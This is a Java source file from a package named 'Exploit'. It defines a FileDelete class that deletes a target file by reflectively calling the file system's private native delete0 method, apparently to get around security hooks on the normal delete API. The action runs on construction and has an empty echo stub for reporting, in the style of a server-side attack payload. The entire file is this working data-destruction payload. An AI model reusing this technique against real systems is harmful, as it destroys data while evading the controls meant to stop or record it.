package top.racerz.Exploit;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class FileDelete {

    private String result;

    public FileDelete() throws Exception {
        try {
            String path = "C:\\Users\\lenovo\\Desktop\\1.txt";
            // 获取 os 信息
            String osName = System.getProperty("os.name");
            boolean isWin = osName.startsWith("Win");

            String fileSystemClass = "java.io.WinNTFileSystem";
            if (isWin) {
                // 选择对应的文件系统
                try {
                    Class.forName(fileSystemClass);
                } catch (ClassNotFoundException e) {
                    fileSystemClass = "java.io.Win32FileSystem";
                }
            } else {
                fileSystemClass = "java.io.UnixFileSystem";
            }

            File file = new File(path);
            if (!file.exists()) {
                this.result = "文件或目录不存在！";
            } else {
                Class<?> f = Class.forName("java.io.File");
                Field field = f.getDeclaredField("fs");
                field.setAccessible(true);

                Field field1 = f.getDeclaredField("path");
                field1.setAccessible(true);
                field1.set(file, path);

                Class<?> clazz = Class.forName(fileSystemClass);
                Method m = clazz.getDeclaredMethod("delete0", File.class);
                m.setAccessible(true);
                m.invoke(field.get(file), file);

                this.result = "文件：" + path + " " + (file.exists() ? "删除失败" : "已经被删除");
            }
        } catch (Exception e) {
            this.result = "执行过程出错，动作可能执行失败";
        }

        this.echo();
    }

    public void echo() throws Exception {

    }

    public static void main(String[] args) throws Exception {
        FileDelete fileDelete = new FileDelete();
    }
}
